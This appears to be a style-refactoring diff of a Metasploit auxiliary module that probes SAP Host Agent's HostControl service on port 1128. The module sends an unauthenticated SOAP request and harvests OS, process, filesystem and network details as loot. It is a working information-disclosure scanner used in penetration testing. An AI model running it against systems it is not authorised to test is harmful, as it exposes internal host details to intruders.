@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,19 +8,17 @@ require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
       'Name' => 'SAP Host Agent Information Disclosure',
-      'Description' => %q{
+      'Description' => %q(
         This module attempts to retrieve Computer and OS info from Host Agent
         through the SAP HostControl service.
-        },
+        ),
       'References' =>
         [
           # General
@@ -39,15 +38,13 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(1128)
-      ], self.class)
+      ], self.class
+    )
 
     register_autofilter_ports([1128])
-
-
   end
 
   def initialize_tables
-
     @computer_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
       'Header' => "Remote Computer Listing",
@@ -59,7 +56,8 @@ class MetasploitModule < Msf::Auxiliary
           "Names",
           "Hostnames",
           "IPAddresses"
-        ])
+        ]
+    )
 
     @os_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -80,7 +78,8 @@ class MetasploitModule < Msf::Auxiliary
           "CPU User",
           "CPU Sys",
           "CPU Idle"
-        ])
+        ]
+    )
     @net_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
       'Header' => "Network Port Listing",
@@ -95,7 +94,8 @@ class MetasploitModule < Msf::Auxiliary
           "ErrorsIn",
           "ErrorsOut",
           "Collisions"
-        ])
+        ]
+    )
 
     @process_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -114,7 +114,8 @@ class MetasploitModule < Msf::Auxiliary
           "CPU",
           "CPU Time",
           "Command"
-        ])
+        ]
+    )
 
     @fs_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -128,7 +129,8 @@ class MetasploitModule < Msf::Auxiliary
           "Size",
           "Available",
           "Remote"
-        ])
+        ]
+    )
 
     @net_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -144,8 +146,8 @@ class MetasploitModule < Msf::Auxiliary
           "ErrorsIn",
           "ErrorsOut",
           "Collisions"
-        ])
-
+        ]
+    )
   end
 
   # Parses an array of mProperties elements. For every mProperties element,
@@ -180,7 +182,7 @@ class MetasploitModule < Msf::Auxiliary
       success = true
     end
 
-    return success
+    success
   end
 
   # Get the mValues of every item
@@ -191,19 +193,17 @@ class MetasploitModule < Msf::Auxiliary
     item_list.each do |item|
       value_item = item.get_elements("mValue")
 
-      if value_item.empty?
-        value = ""
-      else
-        value = value_item.first.text
-      end
+      value = if value_item.empty?
+                ""
+              else
+                value_item.first.text
+              end
 
-      if value == ignore
-        next
-      end
+      next if value == ignore
 
       values << value
     end
-    return values
+    values
   end
 
   # Parses an array of mProperties elements and get the interesting info
@@ -211,22 +211,22 @@ class MetasploitModule < Msf::Auxiliary
   # ITSAMNetworkPort properties.
   def parse_detailed_info(data)
     data.each do |properties|
-      if not properties.get_elements("item//mValue[text()=\"ITSAMOperatingSystem\"]").empty?
+      unless properties.get_elements("item//mValue[text()=\"ITSAMOperatingSystem\"]").empty?
         values = parse_values(properties, "ITSAMOperatingSystem")
         parse_os_info(values)
       end
 
-      if not properties.get_elements("item//mValue[text()=\"ITSAMOSProcess\"]").empty?
+      unless properties.get_elements("item//mValue[text()=\"ITSAMOSProcess\"]").empty?
         values = parse_values(properties, "ITSAMOSProcess")
         parse_process_info(values)
       end
 
-      if not properties.get_elements("item//mValue[text()=\"ITSAMFileSystem\"]").empty?
+      unless properties.get_elements("item//mValue[text()=\"ITSAMFileSystem\"]").empty?
         values = parse_values(properties, "ITSAMFileSystem")
         parse_fs_info(values)
       end
 
-      if not properties.get_elements("item//mValue[text()=\"ITSAMNetworkPort\"]").empty?
+      unless properties.get_elements("item//mValue[text()=\"ITSAMNetworkPort\"]").empty?
         values = parse_values(properties, "ITSAMNetworkPort")
         parse_net_info(values)
       end
@@ -243,9 +243,9 @@ class MetasploitModule < Msf::Auxiliary
       os_info[12],     # Load Average (5m)
       os_info[13],     # Load Average (15m)
       os_info[17],     # Number of CPUs / Cores
-      os_info[18]+'%', # CPU usage (User)
-      os_info[19]+'%', # CPU usage (system)
-      os_info[20]+'%'  # CPU idle
+      os_info[18] + '%', # CPU usage (User)
+      os_info[19] + '%', # CPU usage (system)
+      os_info[20] + '%'  # CPU idle
     ]
   end
 
@@ -257,7 +257,7 @@ class MetasploitModule < Msf::Auxiliary
       process_info[3],     # Priority
       process_info[4],     # Mem size
       process_info[5],     # pages
-      process_info[6]+'%', # CPU usage
+      process_info[6] + '%', # CPU usage
       process_info[7],     # CPU time
       process_info[8]      # Command
     ]
@@ -283,9 +283,7 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-
   def run_host(rhost)
-
     vprint_status("#{rhost}:#{rport} - Connecting to SAP Host Control service")
 
     data = '<?xml version="1.0" encoding="utf-8"?>'
@@ -300,31 +298,30 @@ class MetasploitModule < Msf::Auxiliary
     begin
 
       res = send_request_raw(
-        {
-          'uri' => "/",
-          'method' => 'POST',
-          'data' => data,
-          'headers' => {
-            'Content-Type' => 'text/xml; charset=UTF-8',
-          }
-        })
+        'uri' => "/",
+        'method' => 'POST',
+        'data' => data,
+        'headers' => {
+          'Content-Type' => 'text/xml; charset=UTF-8'
+        }
+      )
 
     rescue ::Rex::ConnectionError
       vprint_error("#{rhost}:#{rport} - Unable to connect to service")
       return
     end
 
-    if res and res.code == 500 and res.body =~ /<faultstring>(.*)<\/faultstring>/i
-      faultcode = $1.strip
+    if res && (res.code == 500) && res.body =~ /<faultstring>(.*)<\/faultstring>/i
+      faultcode = Regexp.last_match(1).strip
       vprint_error("#{rhost}:#{rport} - Error code: #{faultcode}")
       return
 
-    elsif res and res.code != 200
+    elsif res && (res.code != 200)
       vprint_error("#{rhost}:#{rport} - Error in response")
       return
     end
 
-    initialize_tables()
+    initialize_tables
 
     vprint_good("#{rhost}:#{rport} - Connected. Retrieving info")
 
@@ -354,7 +351,7 @@ class MetasploitModule < Msf::Auxiliary
       sap_tables_clean << t.to_s
     end
 
-    vprint_good("#{rhost}:#{rport} - Information retrieved:\n"+sap_tables_clean)
+    vprint_good("#{rhost}:#{rport} - Information retrieved:\n" + sap_tables_clean)
 
     xml_raw = store_loot(
       "sap.getcomputersystem",
@@ -375,6 +372,5 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     print_status("#{rhost}:#{rport} - Response stored in #{xml_raw} (XML) and #{xml_parsed} (TXT)")
-
   end
 end
